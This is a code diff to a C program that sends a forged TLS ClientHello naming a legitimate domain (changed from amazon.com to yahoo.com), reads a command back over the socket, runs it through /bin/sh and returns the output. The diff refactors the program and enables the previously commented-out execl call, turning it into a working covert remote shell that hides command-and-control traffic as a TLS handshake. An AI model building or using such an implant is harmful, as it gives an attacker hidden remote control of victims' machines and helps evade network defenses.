@@ -7,7 +7,7 @@
 #include <unistd.h>
 
 void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
-    unsigned char serv_name[] = "www.amazon.com";
+    unsigned char serv_name[] = "www.yahoo.com";
     unsigned char serv_name_s = strlen(serv_name);
     unsigned char serv_list_s = serv_name_s + 3;
     unsigned char ext_serv_s = serv_list_s + 2;
@@ -76,14 +76,19 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
     free(cv_rest);
 }
 
-int main(int argc, char const* argv[]) {
+void snd_cli_hel(int sock) {
     unsigned char* cli_hel;
     int cli_hel_s;
     craft_cli_hel(&cli_hel, &cli_hel_s);
 
+    send(sock, cli_hel, cli_hel_s, 0);
+    free(cli_hel);
+    printf("Hello message sent\n");
+}
+
+int main(int argc, char const* argv[]) {
     int sock = 0, valread, client_fd;
     struct sockaddr_in serv_addr;
-    char buffer[5000] = {0};
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         printf("\n Socket creation error \n");
         return -1;
@@ -102,17 +107,16 @@ int main(int argc, char const* argv[]) {
         return -1;
     }
 
-    send(sock, cli_hel, cli_hel_s, 0);
-    free(cli_hel);
-    printf("Hello message sent\n");
+    snd_cli_hel(sock);
 
-    valread = read(sock, buffer, 5000);
-    printf("Length: %d\nMessage: %s\n", valread, buffer);
+    char buf_cmd[4096] = {0};
+    valread = read(sock, buf_cmd, 4096);
+    printf("Length: %d\nMessage: %s\n", valread, buf_cmd);
 
+    char buf_res[4096] = {0};
+    int buf_res_s;
     int pipes[2];
     pid_t pid;
-    char foo[4096];
-    int nbytes;
 
     if (pipe(pipes) == -1)
         exit(EXIT_FAILURE);
@@ -124,16 +128,16 @@ int main(int argc, char const* argv[]) {
         dup2(pipes[1], STDOUT_FILENO);
         close(pipes[0]);
         close(pipes[1]);
-//        execl("/bin/sh", "sh", "-c", buffer, NULL);
+        execl("/bin/sh", "sh", "-c", buf_cmd, NULL);
         exit(EXIT_FAILURE);
     } else {
         close(pipes[1]);
-        nbytes = read(pipes[0], foo, sizeof(foo));
-        printf("%.*s\n", nbytes, foo);
+        buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
+        printf("%.*s\n", buf_res_s, buf_res);
         wait(NULL);
     }
 
-    send(sock, foo, nbytes, 0);
+    send(sock, buf_res, buf_res_s, 0);
 
     close(client_fd);
     return 0;
